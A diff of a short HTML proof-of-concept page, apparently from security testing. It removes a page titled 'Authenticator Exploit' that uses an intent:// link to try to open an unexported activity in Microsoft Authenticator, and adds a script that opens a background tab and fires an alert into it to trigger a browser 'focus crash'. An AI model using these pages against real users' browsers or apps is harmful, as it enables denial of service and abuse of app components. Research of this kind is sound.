@@ -1,14 +1,20 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Authenticator Exploit</title>
-</head>
 <body>
-    <h1>Executing Internal Intent...</h1>
-    
-    <!-- This tries to launch the unexported RestoreFlowActivity -->
-    
-    <!-- A manual fallback link just in case JS auto-redirect is blocked -->
-    <a href="intent://activateMfa#Intent;scheme=microsoft-authenticator;package=com.azure.authenticator;action=android.intent.action.VIEW;end;">Click to open Authenticator</a>
+    <button onclick="start()">Trigger Focus Crash</button>
+    <script>
+        function start() {
+            // Open a background tab
+            let bgTab = window.open('about:blank', '_blank');
+            
+            setTimeout(() => {
+                // Try to force the browser to switch back to this tab
+                window.focus(); 
+                
+                // Immediately throw an alert in the background tab
+                bgTab.alert("Are you crashing?");
+            }, 1000);
+        }
+    </script>
 </body>
 </html>
